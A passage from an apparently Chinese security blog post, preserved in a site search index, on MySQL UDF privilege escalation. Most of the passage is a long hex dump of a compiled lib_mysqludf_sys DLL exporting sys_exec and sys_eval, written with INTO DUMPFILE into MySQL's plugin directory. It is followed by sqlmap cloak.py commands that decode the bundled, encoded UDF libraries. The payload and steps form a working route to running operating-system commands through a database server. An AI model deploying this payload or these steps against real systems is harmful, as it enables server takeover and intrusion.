dbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;D:<span class="hljs-symbol">\\</span>env<span class="hljs-symbol">\\</span>php<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>dll和so文件</p><p>sqlmap中<code>.dll</code>和<code>.so</code>文件的路径：<code>sqlmap/data/udf/mysql</code></p><p>不过 sqlmap 中自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用sqlmap 自带的解码工具<code>cloak.py</code>来解码使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-variable">$pwd</span><br><span class="hljs-regexp">/mnt/</span>c<span class="hljs-regexp">/Penetration/</span>DatabaseTools<span class="hljs-regexp">/SQLMap/</span>extra/cloak<br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>更多攻击方法参考</strong></p><p>https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
